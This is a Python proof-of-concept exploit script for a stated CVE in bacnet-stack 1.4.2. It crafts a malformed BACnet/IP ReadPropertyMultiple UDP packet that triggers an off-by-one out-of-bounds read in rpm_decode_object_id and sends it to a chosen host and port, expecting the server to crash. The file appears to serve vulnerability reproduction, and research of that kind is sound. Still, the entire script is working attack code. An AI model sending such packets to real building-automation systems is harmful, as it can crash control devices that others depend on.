#!/usr/bin/env python3
"""
CVE-2026-41502 PoC - bacnet-stack 1.4.2 off-by-one OOB read in
rpm_decode_object_id() (src/bacnet/rpm.c).

A ReadPropertyMultiple request whose service body is exactly 5 bytes passes the
`apdu_len < 5` guard, gets 1 byte (context tag) + 4 bytes (object id) consumed,
then the handler reads apdu[5] (the opening-tag check) one byte past the received
PDU. Under the ASan moving-fence build this aborts in decode_tag_number.

Usage: python3 bacnet_cve_2026_41502_real_poc.py [host] [port]
"""
import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 47808


def build_packet() -> bytes:
    # Confirmed-request APDU: type=0x00, max-seg/apdu=0x05, invoke-id=0x01,
    # service-choice=0x0E (ReadPropertyMultiple). Service body = exactly 5 bytes:
    # context tag 0 (0x0C) + 4-byte object id -> rpm_decode_object_id reads apdu[5].
    apdu = bytes([0x00, 0x05, 0x01, 0x0E]) + bytes([0x0C, 0x02, 0x00, 0x00, 0x01])
    npdu = bytes([0x01, 0x04])  # version 1, control: expecting-reply
    body = npdu + apdu
    bvlc = bytes([0x81, 0x0A]) + struct.pack(">H", 4 + len(body))  # Original-Unicast-NPDU
    return bvlc + body


def main() -> None:
    pkt = build_packet()
    print(f"[*] CVE-2026-41502 -> {host}:{port} ({len(pkt)} B) {pkt.hex()}")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(pkt, (host, port))
    try:
        s.settimeout(2)
        print("[*] reply:", s.recvfrom(1500)[0].hex())
    except socket.timeout:
        print("[*] no reply (server crashed - check `docker logs` for ASan abort)")
    finally:
        s.close()


if __name__ == "__main__":
    main()
